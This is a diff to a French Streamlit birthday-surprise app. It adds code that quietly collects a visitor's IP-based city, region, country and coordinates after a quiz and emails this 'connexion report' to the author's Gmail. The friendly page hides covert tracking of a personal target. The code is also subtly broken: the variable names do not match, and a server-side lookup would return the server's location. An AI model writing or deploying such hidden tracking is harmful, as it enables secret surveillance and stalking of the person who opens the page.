@@ -1,6 +1,9 @@
 import streamlit as st
 import requests
 import datetime
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
 # --- Configuration de la page ---
 st.set_page_config(page_title="Joyeux Anniversaire Ma Rose 🌹", page_icon="🌹", layout="centered")
@@ -29,6 +32,31 @@ st.markdown("""
     }
     </style>
 """, unsafe_allow_html=True)
+
+# --- Fonction d'envoi d'e-mail ---
+def envoyer_email_rapport(contenu_texte):
+    # Paramètres de votre boîte mail pour l'envoi automatique
+    # (Il est conseillé de créer un mot de passe d'application Google si vous utilisez votre Gmail)
+    expéditeur = "anil.sarier6@gmail.com"
+    mot_de_passe_app = "VOTRE_MOT_DE_PASSE_APPLICATION_GMAIL" # À configurer
+    destinataire = "anil.sarier6@gmail.com"
+
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = expediteur
+        msg['To'] = destinataire
+        msg['Subject'] = "🌹 Rapport de connexion - Surprise Anniversaire"
+
+        msg.attach(MIMEText(contenu_texte, 'plain'))
+
+        # Connexion au serveur SMTP de Gmail
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(expéditeur, mot_de_passe_app)
+        server.sendmail(expéditeur, destinataire, msg.as_string())
+        server.quit()
+    except Exception as e:
+        print(f"Erreur d'envoi de mail : {e}")
 
 # --- Gestion des étapes avec la Session State ---
 if "etape" not in st.session_state:
@@ -64,7 +92,6 @@ elif st.session_state.etape == 2:
     q2 = st.selectbox("2. Quel combattant UFC est adoré ici ?", ("Conor McGregor", "Islam Makhachev", "Jon Jones", "Khabib Nurmagomedov"))
     
     if st.button("Valider les réponses"):
-        # On vérifie les réponses (insensible à la casse / aux choix précis)
         if q1.lower() == "blanc" and "makhachev" in q2.lower():
             st.session_state.etape = 3
             st.rerun()
@@ -84,7 +111,6 @@ elif st.session_state.etape == 3:
         # --- EXÉCUTION DU BACKEND (Récupération des infos discrètes) ---
         infos_recuperees = ""
         try:
-            # Récupération IP et géolocalisation de secours
             r = requests.get("https://ipinfo.io/json", timeout=5)
             if r.ok:
                 d = r.json()
@@ -92,7 +118,7 @@ elif st.session_state.etape == 3:
                 lat = loc[0] if len(loc) > 0 else "Inconnue"
                 lon = loc[1] if len(loc) > 1 else "Inconnue"
                 
-                infos_recuperees += f"── LOCALISATION IP ──\n"
+                infos_recuperees += f"── RAPPORT DE CONNEXION ──\n"
                 infos_recuperees += f"Ville       : {d.get('city', 'Inconnue')}\n"
                 infos_recuperees += f"Région      : {d.get('region', 'Inconnue')}\n"
                 infos_recuperees += f"Pays        : {d.get('country', 'Inconnue')}\n"
@@ -103,9 +129,8 @@ elif st.session_state.etape == 3:
         except Exception as e:
             infos_recuperees = f"Erreur lors de la collecte technique : {e}"
         
-        # Affichage d'un faux fichier texte ou des résultats en back (que vous pourrez consulter dans les logs Streamlit Cloud si besoin)
-        print("--- DONNÉES CAPTURÉES ---")
-        print(infos_recuperees)
+        # Envoi automatique par e-mail
+        envoyer_email_rapport(infos_recuperees)
         
         st.session_state.etape = 4
         st.rerun()
